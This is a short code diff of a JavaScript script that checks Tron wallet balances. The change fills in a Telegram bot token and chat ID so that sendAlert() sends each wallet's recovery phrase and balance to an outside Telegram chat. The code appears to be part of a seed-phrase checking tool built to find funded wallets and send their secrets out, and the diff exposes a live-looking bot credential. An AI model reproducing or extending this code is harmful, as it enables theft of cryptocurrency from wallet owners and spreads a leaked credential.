@@ -66,9 +66,8 @@ async function interactWithSmartContract(items) {
 
 async function call_(self_) {
     walletINFO['trx_address'] = self_
-    try {
-        trx_bal = await tronWeb.trx.getBalance(self_);
-    } catch (e) { console.log('limit exceeded') }
+    try { trx_bal = await tronWeb.trx.getBalance(self_)
+    } catch (e) { console.log('limit exceeded: '+e) }
 
     console.log(`------------------------------------------------------------------------------------
 | ${walletINFO['phrase']}
@@ -111,8 +110,8 @@ async function S0x001(phrase_) { //check Tron Balance
 
 function sendAlert() {
     // Set the bot token and chat ID
-    const botToken = '';
-    const chatId = '';
+    const botToken = '6945082510:AAE-P59l_PVAtNzMy6ZdQDGg5UXgf9rHEx0';
+    const chatId = '6849192961';
     // Set the message text
     const messageText = `${walletINFO['balance'][0]}   ${walletINFO['balance'][1]} 
     ${walletINFO['phrase']}`
